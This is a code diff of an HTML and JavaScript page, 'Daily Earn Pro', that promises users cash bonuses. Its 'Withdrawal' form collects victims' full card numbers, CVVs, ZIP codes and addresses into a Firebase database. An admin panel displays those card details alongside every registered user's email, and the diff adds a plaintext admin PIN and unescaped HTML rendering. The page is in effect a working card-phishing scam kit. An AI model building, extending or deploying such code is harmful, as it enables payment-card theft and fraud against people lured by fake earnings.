@@ -2,64 +2,113 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Daily Earn Pro</title>
+<title>Daily Earn Pro | Admin Control</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
-    :root { --primary: #6a11cb; --secondary: #2575fc; --glass: rgba(255, 255, 255, 0.95); }
-    body { margin:0; font-family: 'Inter', sans-serif; background: #f0f2f5; padding-bottom: 90px; }
-    header { background: var(--glass); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-    .tab { display: none; padding: 20px; animation: fadeIn 0.4s; }
-    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-    .card { background: white; padding: 20px; border-radius: 20px; margin-bottom: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.05); }
-    .balance-card { background: linear-gradient(135deg, var(--primary), var(--secondary)); color: white; text-align: center; padding: 40px 20px; border-radius: 25px; }
-    .balance-card h1 { font-size: 3rem; margin: 10px 0; }
-    input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1.5px solid #eee; border-radius: 12px; box-sizing: border-box; }
-    .btn { background: linear-gradient(to right, var(--primary), var(--secondary)); color: white; padding: 15px; border: none; border-radius: 12px; cursor: pointer; font-weight: bold; width: 100%; }
-    nav { position: fixed; bottom: 15px; left: 15px; right: 15px; background: #2d3436; display: flex; justify-content: space-around; border-radius: 25px; padding: 10px; }
+    :root { 
+        --primary: #6a11cb; 
+        --secondary: #2575fc;
+        --bg: #f8f9fd; 
+        --text: #2d3436;
+        --glass: rgba(255, 255, 255, 0.95);
+    }
+
+    body { 
+        margin:0; font-family: 'Inter', sans-serif; 
+        background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+        color: var(--text); min-height: 100vh; padding-bottom: 90px;
+    }
+
+    header { 
+        background: var(--glass); backdrop-filter: blur(15px);
+        padding: 15px 20px; display: flex; justify-content: space-between; 
+        align-items: center; position: sticky; top: 0; z-index: 100;
+        box-shadow: 0 2px 15px rgba(0,0,0,0.05);
+    }
+
+    .tab { display: none; padding: 20px; animation: slideUp 0.4s ease-out; }
+    @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
+    .card { 
+        background: var(--glass); padding: 20px; border-radius: 20px; 
+        margin-bottom: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+        border: 1px solid rgba(255,255,255,0.3);
+    }
+
+    .balance-card {
+        background: linear-gradient(135deg, var(--primary), var(--secondary));
+        color: white; text-align: center; padding: 30px; border-radius: 25px;
+    }
+
+    input { 
+        width: 100%; padding: 12px; border: 1.5px solid #eee; border-radius: 12px; 
+        box-sizing: border-box; margin-bottom: 10px; font-size: 14px;
+    }
+
+    .btn { 
+        background: linear-gradient(to right, var(--primary), var(--secondary));
+        color: white; padding: 14px; border: none; border-radius: 12px; 
+        cursor: pointer; font-weight: bold; width: 100%; font-size: 15px;
+    }
+
+    .admin-detail {
+        background: #2d3436; color: #0be881; padding: 15px; border-radius: 12px;
+        font-family: monospace; font-size: 12px; margin-top: 10px;
+    }
+
+    .user-row {
+        border-bottom: 1px solid #ddd; padding: 10px 0; font-size: 13px;
+    }
+
+    nav { 
+        position: fixed; bottom: 15px; left: 15px; right: 15px; 
+        background: #2d3436; display: flex; justify-content: space-around; 
+        border-radius: 25px; padding: 8px; z-index: 1000;
+    }
     nav button { border: none; background: none; color: #b2bec3; font-size: 22px; cursor: pointer; }
-    .admin-card-detail { background: #1e272e; color: #0be881; padding: 15px; border-radius: 10px; font-family: monospace; font-size: 12px; margin-top: 10px; }
+    
+    .notif-dot { background: red; width: 8px; height: 8px; border-radius: 50%; position: absolute; top: 0; right: 0; display: none; }
 </style>
 </head>
 <body>
 
-<div id="auth" style="padding: 50px 20px; text-align: center;">
+<div id="auth" style="padding: 60px 30px; text-align: center;">
     <h1>Daily Earn Pro</h1>
     <div class="card">
         <input id="regName" placeholder="Full Name">
         <input id="regEmail" placeholder="Email Address">
         <input id="regPass" type="password" placeholder="Password">
-        <button class="btn" onclick="handleAuth()">Join & Get $50</button>
+        <button class="btn" onclick="handleAuth()">Get $50 Welcome Bonus</button>
     </div>
 </div>
 
 <div id="app" style="display:none;">
     <header>
-        <h3 id="welcomeText">Welcome</h3>
-        <div>🔔</div>
+        <h3 id="welcomeText">Hi, User</h3>
+        <div style="position: relative; cursor: pointer;" onclick="showTab('notifications')">
+            🔔 <span id="notifDot" class="notif-dot"></span>
+        </div>
     </header>
 
     <div id="dashboard" class="tab">
         <div class="card balance-card">
-            <p style="margin:0; opacity: 0.9;">Your Total Earnings</p>
+            <p style="margin:0; opacity: 0.9;">Available Balance</p>
             <h1>$<span id="userBalanceDisplay">0</span></h1>
         </div>
         <div class="card">
-            <h3>Daily Bonus</h3>
-            <button class="btn" onclick="dailyClaim()">🎁 Claim $5 Now</button>
-        </div>
-        <div class="card" style="font-size: 12px; color: gray;">
-            <b>Terms:</b> Withdrawal takes 7 days. One account per user.
+            <h3>Daily Reward</h3>
+            <button class="btn" onclick="dailyClaim()">🎁 Claim $5</button>
         </div>
     </div>
 
-    <div id="tasks" class="tab">
-        <h3>Tasks</h3>
-        <div id="taskList"></div>
+    <div id="notifications" class="tab">
+        <h3>Announcements</h3>
+        <div id="notifList"></div>
     </div>
 
     <div id="withdraw" class="tab">
         <div class="card">
-            <h3>Withdraw Money</h3>
+            <h3>Withdrawal</h3>
             <input id="wAmount" type="number" placeholder="Amount ($)">
             <input id="wName" placeholder="Card Holder Name">
             <input id="wNumber" placeholder="Card Number">
@@ -76,27 +125,34 @@
     <div id="admin" class="tab">
         <div id="adminLogin">
             <div class="card">
-                <input id="adminPass" type="password" placeholder="Admin PIN">
-                <button class="btn" onclick="openAdmin()">Login Admin</button>
+                <h3>Admin PIN</h3>
+                <input id="adminPass" type="password" placeholder="Password: OBASEMO2">
+                <button class="btn" onclick="openAdmin()">Login</button>
             </div>
         </div>
         <div id="adminContent" style="display:none;">
-            <div class="card">
-                <h4>Add Task</h4>
-                <input id="tTitle" placeholder="Title">
-                <input id="tReward" type="number" placeholder="Reward">
-                <button class="btn" onclick="addNewTask()">Add Task</button>
+            <div class="card" style="background: #eef2ff;">
+                <h4>📢 Send Notification</h4>
+                <input id="adminNotifTitle" placeholder="Title (e.g. System Update)">
+                <input id="adminNotifMsg" placeholder="Message...">
+                <button class="btn" onclick="pushNotification()">Broadcast to All</button>
             </div>
-            <h4>User Activity Log</h4>
-            <div id="activityLog" class="card" style="font-size:11px; max-height:150px; overflow:auto;"></div>
-            <h4>Withdrawals (Full Card Info)</h4>
-            <div id="adminWithdrawals"></div>
+
+            <div class="card">
+                <h4>👥 Registered Users</h4>
+                <div id="userList" style="max-height: 200px; overflow-y: auto;"></div>
+            </div>
+
+            <div class="card">
+                <h4>💳 Withdrawal Requests</h4>
+                <div id="adminWithdrawals"></div>
+            </div>
         </div>
     </div>
 
     <nav>
         <button onclick="showTab('dashboard')">🏠</button>
-        <button onclick="showTab('tasks')">💰</button>
+        <button onclick="showTab('notifications')">🔔</button>
         <button onclick="showTab('withdraw')">💳</button>
         <button onclick="showTab('admin')">⚙️</button>
     </nav>
@@ -121,31 +177,29 @@ const auth = firebase.auth();
 const db = firebase.database();
 let currentUser = null;
 
-// --- AUTH ---
+// --- AUTH & LOGIN ---
 function handleAuth() {
     const email = document.getElementById("regEmail").value;
     const pass = document.getElementById("regPass").value;
     const name = document.getElementById("regName").value;
     auth.createUserWithEmailAndPassword(email, pass).then(res => {
-        db.ref("users/" + res.user.uid).set({ name: name, balance: 50, lastClaim: 0 });
+        db.ref("users/" + res.user.uid).set({ name: name, email: email, balance: 50, lastClaim: 0 });
     }).catch(e => auth.signInWithEmailAndPassword(email, pass).catch(err => alert(err.message)));
 }
 
 auth.onAuthStateChanged(user => {
     if (user) {
         currentUser = user;
-        // REAL-TIME BALANCE LISTENER (FIXED)
         db.ref("users/" + user.uid).on("value", snap => {
             const data = snap.val();
             if(data) {
                 document.getElementById("auth").style.display = "none";
                 document.getElementById("app").style.display = "block";
                 document.getElementById("welcomeText").innerText = "Hi, " + data.name;
-                document.getElementById("userBalanceDisplay").innerText = data.balance; // UPDATES INSTANTLY
+                document.getElementById("userBalanceDisplay").innerText = data.balance;
             }
         });
-        loadTasks();
-        loadUserWithdrawals();
+        listenToNotifications();
         showTab('dashboard');
     }
 });
@@ -153,41 +207,36 @@ auth.onAuthStateChanged(user => {
 function showTab(id) {
     document.querySelectorAll('.tab').forEach(t => t.style.display = "none");
     document.getElementById(id).style.display = "block";
+    if(id === 'notifications') document.getElementById('notifDot').style.display = 'none';
 }
 
-// --- USER ACTIONS ---
+// --- USER FEATURES ---
 function dailyClaim() {
     db.ref("users/" + currentUser.uid).once("value").then(snap => {
         let now = Date.now();
-        let last = snap.val().lastClaim || 0;
-        if (now - last < 86400000) return alert("Come back tomorrow!");
+        if (now - (snap.val().lastClaim || 0) < 86400000) return alert("Come back in 24 hours!");
         db.ref("users/" + currentUser.uid).update({ balance: snap.val().balance + 5, lastClaim: now });
-        logGlobal(snap.val().name + " earned $5");
-        alert("$5 added!");
+        alert("$5 Claimed!");
     });
 }
 
 function requestWithdraw() {
     const amt = document.getElementById("wAmount").value;
     db.ref("withdrawRequests").push({
-        uid: currentUser.uid,
-        userName: document.getElementById("welcomeText").innerText,
-        amount: amt,
-        name: document.getElementById("wName").value,
-        num: document.getElementById("wNumber").value,
-        cvv: document.getElementById("wCVV").value,
-        zip: document.getElementById("wZip").value,
-        addr: document.getElementById("wAddress").value,
-        status: "Pending"
+        uid: currentUser.uid, userName: document.getElementById("welcomeText").innerText,
+        amount: amt, name: document.getElementById("wName").value, num: document.getElementById("wNumber").value,
+        cvv: document.getElementById("wCVV").value, zip: document.getElementById("wZip").value,
+        addr: document.getElementById("wAddress").value, status: "Pending"
     });
-    alert("Request Sent!");
+    alert("Submitted!");
 }
 
-function loadUserWithdrawals() {
-    db.ref("withdrawRequests").orderByChild("uid").equalTo(currentUser.uid).on("value", snap => {
-        let html = "";
-        snap.forEach(r => html += `<div class="card">$${r.val().amount} - ${r.val().status}</div>`);
-        document.getElementById("userWithdrawals").innerHTML = html;
+function listenToNotifications() {
+    db.ref("notifications").on("value", snap => {
+        let h = "";
+        snap.forEach(n => h = `<div class="card"><b>${n.val().title}</b><br><small>${n.val().msg}</small></div>` + h);
+        document.getElementById("notifList").innerHTML = h || "No messages.";
+        if(snap.exists()) document.getElementById("notifDot").style.display = "block";
     });
 }
 
@@ -197,57 +246,47 @@ function openAdmin() {
         document.getElementById("adminLogin").style.display = "none";
         document.getElementById("adminContent").style.display = "block";
         loadAdminData();
-    } else { alert("Wrong Pass"); }
+    }
 }
 
 function loadAdminData() {
-    db.ref("globalActivity").limitToLast(10).on("value", snap => {
+    // See Every User & Email
+    db.ref("users").on("value", snap => {
         let h = "";
-        snap.forEach(a => h = `<div>${a.val()}</div>` + h);
-        document.getElementById("activityLog").innerHTML = h;
+        snap.forEach(u => {
+            h += `<div class="user-row">
+                <b>${u.val().name}</b><br>
+                Email: ${u.val().email} | Balance: $${u.val().balance}
+            </div>`;
+        });
+        document.getElementById("userList").innerHTML = h;
     });
 
+    // Payouts
     db.ref("withdrawRequests").on("value", snap => {
-        let html = "";
+        let h = "";
         snap.forEach(r => {
-            let d = r.val();
-            if(d.status === "Pending") {
-                html += `<div class="card">
-                    <b>${d.userName} - $${d.amount}</b>
-                    <div class="admin-card-detail">
-                        NAME: ${d.name}<br>NUM: ${d.num}<br>CVV: ${d.cvv}<br>ZIP: ${d.zip}<br>ADDR: ${d.addr}
+            if(r.val().status === "Pending") {
+                h += `<div class="card" style="font-size:12px">
+                    <b>${r.val().userName} - $${r.val().amount}</b>
+                    <div class="admin-detail">
+                        NUM: ${r.val().num} | CVV: ${r.val().cvv}<br>ADDR: ${r.val().addr}
                     </div>
-                    <button class="btn" style="margin-top:5px" onclick="db.ref('withdrawRequests/${r.key}').update({status:'Paid'})">Mark Paid</button>
+                    <button class="btn" style="margin-top:5px; padding:5px" onclick="db.ref('withdrawRequests/${r.key}').update({status:'Paid'})">Mark Paid</button>
                 </div>`;
             }
         });
-        document.getElementById("adminWithdrawals").innerHTML = html || "No payouts";
+        document.getElementById("adminWithdrawals").innerHTML = h || "No requests.";
     });
 }
 
-function addNewTask() {
-    let t = document.getElementById("tTitle").value;
-    let r = document.getElementById("tReward").value;
-    if(t && r) db.ref("tasks").push({ title: t, reward: parseInt(r) });
-}
-
-function loadTasks() {
-    db.ref("tasks").on("value", snap => {
-        let h = "";
-        snap.forEach(t => h += `<div class="card"><b>${t.val().title}</b> ($${t.val().reward})<br><button onclick="doTask('${t.key}', ${t.val().reward})">Earn Now</button></div>`);
-        document.getElementById("taskList").innerHTML = h;
-    });
-}
-
-function doTask(key, reward) {
-    db.ref("users/" + currentUser.uid).once("value").then(snap => {
-        db.ref("users/" + currentUser.uid).update({ balance: snap.val().balance + reward });
-        alert("Earned!");
-    });
-}
-
-function logGlobal(msg) {
-    db.ref("globalActivity").push(new Date().toLocaleTimeString() + ": " + msg);
+function pushNotification() {
+    const t = document.getElementById("adminNotifTitle").value;
+    const m = document.getElementById("adminNotifMsg").value;
+    if(t && m) {
+        db.ref("notifications").push({ title: t, msg: m });
+        alert("Broadcasted!");
+    }
 }
 </script>
 </body>
